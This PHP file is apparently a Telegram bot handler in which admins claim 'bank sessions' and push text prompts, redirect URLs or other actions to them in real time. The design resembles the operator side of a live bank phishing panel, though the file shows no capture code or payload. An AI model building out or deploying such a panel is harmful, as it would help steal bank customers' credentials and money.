<?php

namespace App\Telegram\Handlers;

use App\Enums\ActionType;
use App\Events\BankSessionUpdated;
use App\Models\Admin;
use App\Models\BankSession;
use SergiX44\Nutgram\Nutgram;

class ActionHandler
{
    public function handle(Nutgram $bot, string $sessionId, string $actionType): void
    {
        /** @var Admin $admin */
        $admin = $bot->get('admin');

        $type = ActionType::tryFrom($actionType);
        if ($type === null) {
            $bot->answerCallbackQuery(text: '⚠️ Unknown action');
            return;
        }

        $session = BankSession::find($sessionId);
        if ($session === null) {
            $bot->answerCallbackQuery(text: '⚠️ Session not found');
            return;
        }

        if ($session->admin_id === null) {
            $session->admin_id = $admin->id;
            $session->save();
        }

        if ($type->requiresText() || $type->requiresUrl()) {
            $admin->setPendingAction([
                'sessionId' => $session->id,
                'actionType' => $type->value,
            ]);
            $prompt = $type->requiresUrl()
                ? 'Send the redirect URL as next message.'
                : 'Send the text for the ' . $type->value . ' as next message.';
            $bot->answerCallbackQuery();
            $bot->sendMessage($prompt);
            return;
        }

        $session->action_type = ['type' => $type->value];
        $session->last_activity_at = now();
        $session->save();
        BankSessionUpdated::dispatch($session);
        $bot->answerCallbackQuery(text: '✓ ' . $type->buttonLabel());
    }
}
